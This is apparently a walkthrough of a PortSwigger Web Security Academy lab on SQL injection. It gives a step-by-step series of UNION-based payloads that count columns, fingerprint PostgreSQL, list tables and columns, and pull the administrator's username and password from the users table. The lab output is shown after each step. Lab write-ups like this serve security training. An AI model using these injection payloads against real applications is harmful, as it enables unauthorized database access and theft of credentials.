#Lab: SQL injection UNION attack, retrieving multiple values in a single column

#https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

```bash
GET /filter?category=Gifts'
```
```bash
GET /filter?category=Gifts'--
```
```bash
Gifts' order by 2--
Gifts' order by 3--
```
```bash
Gifts' UNION SELECT 1,'a'--
```
```bash
Gifts' UNION SELECT 1,version()--

# PostgreSQL 12.18 (Ubuntu 12.18-0ubuntu0.20.04.1)
```
```bash
Gifts' UNION SELECT 1,table_name from information_schema.tables--

# users
```
```bash
Gifts' UNION SELECT 1,column_name from information_schema.columns where table_name = 'users'--

# password
# username
```
```bash
GET /filter?category=Gifts' UNION SELECT 1,username || ' '||password from users--

# administrator u66uzwh23pw8ds7y83l7  
```



